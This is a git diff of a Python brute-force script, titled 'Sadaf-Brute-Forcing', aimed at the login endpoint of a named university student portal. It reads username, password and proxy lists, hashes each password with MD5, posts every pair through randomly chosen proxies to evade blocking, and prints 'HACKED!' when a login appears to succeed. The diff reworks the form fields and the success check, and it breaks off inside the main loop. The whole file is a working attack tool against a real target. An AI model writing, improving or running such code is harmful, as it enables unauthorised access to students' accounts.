@@ -1,13 +1,11 @@
 # Sadaf-Brute-Forcing
 
-# HTTP, HTTPS Or ...
-# Managing Modules
-# Use A Proxy For Multiple Targets
-
 import requests, hashlib, random
 
 print("Sadaf Brute-Forcing Started Working !")
 
+usernames_file = [every_line.strip('\n') for every_line in open('Usernames.txt', 'r')]
+passwords_file = [every_line.strip('\n') for every_line in open('Passwords.txt', 'r')]
 proxies_file = [every_line.strip('\n') for every_line in open('Proxies.txt', 'r')]
 
 
@@ -16,30 +14,25 @@ def convert_to_md5(password):
 
 
 def check_results(username, password):
-    
     proxies = {
         "http": random.choice(proxies_file)
     }
 
-    payload = dict(UserID=username, UserPassword=convert_to_md5(password))
+    data = dict(UserPassword=convert_to_md5(password), pswdStatus='mediocre', UserID=username, DummyVar='')
 
     try:
-        request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', payload, proxies=proxies)
+        request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', data=data, proxies=proxies, timeout=None)
 
         if request.status_code == 200:
-            if 'پورتال دانشجویی' in request.text:
-                print(username + ' - ' + password + ' - Successfully Hacked !')
+            if request.headers['Server'] == 'Apache':
+                print(username + ' - ' + password + ' - HACKED!')
             else:
-                print(username + ' - ' + password)
+                print(username + ' - ' + password + ' - 0')
         else:
             print('HTTP Code Error : ' + username + ' - ' + password)
 
     except:
         print('Connection Error : ' + username + ' - ' + password)
-
-
-usernames_file = [every_line.strip('\n') for every_line in open('Usernames.txt', 'r')]
-passwords_file = [every_line.strip('\n') for every_line in open('Passwords.txt', 'r')]
 
 for checking_username in usernames_file:
     for checking_password in passwords_file:
